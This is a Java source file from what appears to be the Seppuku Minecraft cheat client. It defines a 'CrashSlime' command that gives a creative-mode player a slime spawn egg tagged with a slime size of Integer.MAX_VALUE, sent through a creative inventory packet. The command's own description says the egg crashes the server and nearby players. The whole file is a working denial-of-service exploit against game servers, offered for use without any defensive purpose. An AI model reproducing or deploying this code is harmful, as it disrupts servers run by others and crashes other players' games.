package me.rigamortis.seppuku.impl.command;

import me.rigamortis.seppuku.Seppuku;
import me.rigamortis.seppuku.api.command.Command;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;

/**
 * Author Seth
 * 8/18/2019 @ 9:32 PM.
 */
public final class CrashSlimeCommand extends Command {

    public CrashSlimeCommand() {
        super("CrashSlime", new String[] {"CSlime", "CrashS"}, "Gives you a slime spawn egg that crashes the server and nearby players while in creative mode", "CrashSlime");
    }

    @Override
    public void exec(String input) {
        if (!this.clamp(input, 1, 1)) {
            this.printUsage();
            return;
        }

        final Minecraft mc = Minecraft.getMinecraft();

        if (!mc.player.isCreative()) {
            Seppuku.INSTANCE.errorChat("Creative mode is required to use this command.");
            return;
        }

        final ItemStack itemStack = new ItemStack(Item.getItemById(383));
        final NBTTagCompound tagCompound = (itemStack.hasTagCompound()) ? itemStack.getTagCompound() : new NBTTagCompound();
        final NBTTagCompound entityTag = new NBTTagCompound();

        entityTag.setString("id", "minecraft:slime");
        tagCompound.setTag("EntityTag", entityTag);
        entityTag.setInteger("Size", Integer.MAX_VALUE);
        itemStack.setTagCompound(tagCompound);

        final int slot = this.findEmptyhotbar();

        mc.player.connection.sendPacket(new CPacketCreativeInventoryAction(36 + (slot != -1 ? slot : mc.player.inventory.currentItem), itemStack));
        Seppuku.INSTANCE.logChat("Gave you a crash slime spawn egg");
    }

    private int findEmptyhotbar() {
        for (int i = 0; i < 9; i++) {
            final ItemStack stack = Minecraft.getMinecraft().player.inventory.getStackInSlot(i);

            if (stack.getItem() == Items.AIR) {
                return i;
            }
        }
        return -1;
    }

}
